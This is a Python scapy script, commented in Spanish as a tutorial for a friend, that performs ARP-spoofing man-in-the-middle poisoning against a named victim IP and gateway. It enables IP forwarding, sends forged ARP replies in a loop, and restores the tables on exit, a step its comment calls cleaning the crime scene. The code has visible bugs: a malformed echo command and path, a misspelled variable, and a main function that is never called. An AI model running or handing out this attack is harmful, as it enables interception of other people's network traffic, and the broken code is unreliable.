#! /usr/bin/env python

#####################################################################
#########            EN ESTE SCRIPT VOY A INTENTAR          ######### 
#########   DE EXPLICAR TOD0 PARA MI AMIGO PABLITO CHEWIN   #########
#########     COMO LO QUIERO A MI AMIGO PABLITO CHEWIN      #########
#####################################################################

from scapy.all import*
import sys
import os
import time

## ENTRADA DE DATOS
try: 
    interface=input()
    ipvic=input()
    Gateway=input()

except KeyboardInterrupt:
    print("\n[*] Exeption Error: User requested Shutdown")
    print("[**] Exit...")
    sys.exit(1)

print("\n[*] Habilitando el envio de IP...\n")
os.system("echo1 > /proc/sys/net.ipv4/ip_forward")

## OBTENEMOS LA MAC DE LA VICTIMA CON UN ARP REQUEST
def get_mac(IP):
    conf.verb=0
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2,iface=interface,inter=0.1)
    for snd,rcv in ans:
        return rvc.sprintf(r"%Ether.src%")

## RE-ASIGNANDO LA DIRECCION DEL OBJETIVO (LIMPIANDO LA ESCENA DEL CRIMEN)
def re_ARP():
    print("\n[*] Restaurando Objetivos...")
    VicMAC=get_mac(ipvic)
    GateMAC=get_mac(Gateway)
    send(ARP(op=2,pdst=Gateway,psrc=ipvic,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=VicMAC),count=7)
    send(ARP(op=2,pdst=ipvic,psrc=Gateway,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=GateMAC),count=7)
    print("\n[*] Deshabilitando el Envio De IP...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("\n[**] Apagando...")
    sys.exit(1)

## MANDANDO UN REQUEST ARP A AMBOS OBJETIVOS PARA DECIR QUE YO SOY EL OTRO OBJETIVO (ENGAÑANDO AL SISTEMA)
def trick(gm, vm):
    send(ARP(op=2,pdst=ipvic,psrc=Gateway,hwdst=vm))
    send(ARP(op=2,pdst=Gateway,psrc=ipvic,hwdst=gm))

## FUNCION MAIN
def mitm():
    try:
        vicMac=get_mac(ipvic)
    except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("\n[!] ERROR: No Se Pudo Encontrar La Direccion MAC De La VICTIMA")
            print("\n[!] Saliendo...")
            sys.exit(1)
    try:
        GateMAC=get_mac(Gateway)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("\n[!] ERROR: No Se Pudo Encontrar La Direccion MAC De LA PUERTA DE ENLACE")
        print("\n[!] Saliendo...")
        sys.exit(1)
    print("\n[*] Envenenando Objetivos...")
    while 1:
        try:
            trick(GateMAC, vicMac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            re_ARP()
            break